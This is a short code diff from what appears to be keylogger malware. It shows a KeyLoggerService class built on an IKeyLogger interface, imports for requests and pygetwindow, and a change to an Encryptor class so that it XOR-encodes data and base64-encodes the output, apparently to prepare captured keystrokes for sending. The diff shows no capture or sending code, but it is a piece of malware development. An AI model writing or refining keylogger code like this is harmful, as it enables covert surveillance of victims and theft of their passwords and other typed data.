@@ -1,4 +1,4 @@
-import requests,time,ToolBox,pygetwindow,json,random,string,os
+import requests,time,ToolBox,pygetwindow,json,random,string,os,base64
 from Interface import IKeyLogger,Write
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
@@ -77,9 +77,13 @@ class Encryptor:
     def __init__(self,key):
         self.key = key
 
-    def encrypt(self,data:str) -> str:
-        ciphertext = ""
+    def encrypt(self, data: str) -> str:
+        data_bytes = data.encode('utf-8')
+        ciphertext = bytearray()
         length_key = len(self.key)
-        for index in range(len(data)):
-            ciphertext += chr(ord(data[index]) ^ ord(self.key[index % length_key]))
-        return ciphertext
+
+        for index in range(len(data_bytes)):
+            xor_byte = (data_bytes[index] ^ ord(self.key[index % length_key])) & 0xFF
+            ciphertext.append(xor_byte)
+
+        return base64.b64encode(ciphertext).decode('utf-8')
